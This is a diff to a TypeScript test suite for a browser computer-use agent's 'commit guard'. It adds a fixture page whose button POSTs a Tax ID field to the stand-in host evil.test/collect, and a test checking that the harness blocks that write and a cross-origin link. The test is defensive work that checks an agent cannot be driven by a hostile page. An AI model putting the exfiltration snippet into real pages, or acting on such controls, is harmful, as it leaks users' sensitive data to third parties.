@@ -32,6 +32,12 @@ const LONG_PAGE = `<!doctype html><body style="margin:0;font-family:system-ui">
   <div style="height:2000px"></div><button id=far>Far button</button>
   <button id=save onclick="fetch('/api/save', { method: 'POST', body: '{}' })">Go</button></body>`;
 
+// A portal page that links to and posts to another origin (a hostile or compromised page).
+const OFFSITE_PAGE = `<!doctype html><body style="margin:0;font-family:system-ui">
+  <div style="padding:20px"><label for=tin>Tax ID</label> <input id=tin value="12-3456789"></div>
+  <a href="http://evil.test/verify" style="display:block;padding:20px">Partner check</a>
+  <button style="margin:20px" onclick="fetch('http://evil.test/collect', { method: 'POST', body: tin.value })">Verify partner</button></body>`;
+
 let browser: Browser;
 let context: BrowserContext;
 let page: Page;
@@ -50,6 +56,7 @@ beforeEach(async () => {
     "/long": LONG_PAGE,
     "/next": "<!doctype html><h1>Next page</h1>",
     "/leave": LEAVE_PAGE,
+    "/offsite": OFFSITE_PAGE,
   }));
 });
 // One context per test, closed after it: 18 contexts left open in one Chromium add up under a loaded suite.
@@ -190,6 +197,36 @@ describe("runComputerUse: commit guard", () => {
     expect(click?.tags).toContain("blocked");
     expect(server.hits.filter((h) => h.url.endsWith("/api/save"))).toHaveLength(0);
     expect(notes(model.replies).some((n) => /POST to \/api\/save was blocked/.test(n))).toBe(true);
+  });
+
+  it("aborts a link and a write to another origin: nothing leaves the portal, even with no approval asked", async () => {
+    const evil: string[] = [];
+    await context.route("http://evil.test/**", (route) => {
+      evil.push(`${route.request().method()} ${route.request().url()}`);
+      return route.fulfill({ status: 200, contentType: "text/html", body: "<h1>Partner check</h1>" });
+    });
+    await page.goto(`${FIXTURE_ORIGIN}/offsite`);
+    const model = createScriptedModel(
+      [
+        { do: "click", target: { role: "link", name: "Partner check" } },
+        { do: "click", target: { role: "button", name: "Verify partner" } },
+        { do: "done", text: "ok" },
+      ],
+      page,
+    );
+    const hooks = recordingHooks("approved");
+    const r = await runComputerUse(model, cuInput(page), hooks, CTX);
+    expect(evil).toEqual([]);
+    expect(hooks.commits).toHaveLength(0);
+    expect(page.url()).toBe(`${FIXTURE_ORIGIN}/offsite`);
+    expect(await page.inputValue("#tin")).toBe("12-3456789"); // the page was not replaced
+    expect(
+      r.blockedForeign?.map((f) => `${f.method} ${new URL(f.url).pathname} nav=${f.navigation}`),
+    ).toEqual(["GET /verify nav=true", "POST /collect nav=false"]);
+    expect(r.trace.steps.filter((s) => s.action.type === "click").map((s) => s.tags)).toEqual([
+      ["blocked"],
+      ["blocked"],
+    ]);
   });
 
   it("in propose_only mode returns the proposed target without clicking it", async () => {
